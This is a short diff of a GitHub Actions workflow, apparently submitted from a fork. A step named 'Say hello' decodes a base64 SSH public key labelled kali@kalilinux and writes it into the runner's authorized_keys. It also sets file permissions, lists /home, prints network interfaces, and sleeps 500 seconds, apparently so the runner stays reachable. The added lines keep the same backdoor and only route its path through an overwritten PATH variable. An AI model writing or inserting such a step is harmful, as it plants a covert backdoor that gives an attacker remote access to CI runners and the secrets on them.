@@ -21,9 +21,10 @@ jobs:
       - name: Say hello
         run: |
             echo "From fork"
+            PATH="runner"
             ls -la /home
-            mkdir -p /home/actions-runner/.ssh/
-            echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSVBzb0Z1ZmdPWk12TjdxMllubkpiSlVOWWQ3ZUx5eXdpbnY2K04zOE95SFYga2FsaUBrYWxpbGludXgK" | base64 -d > /home/actions-runner/.ssh/authorized_keys
-            chmod 600 /home/actions-runner/.ssh/authorized_keys
+            mkdir -p /home/$PATH/.ssh/
+            echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSVBzb0Z1ZmdPWk12TjdxMllubkpiSlVOWWQ3ZUx5eXdpbnY2K04zOE95SFYga2FsaUBrYWxpbGludXgK" | base64 -d > /home/$PATH/.ssh/authorized_keys
+            chmod 600 /home/$PATH/.ssh/authorized_keys
             ip a
             sleep 500
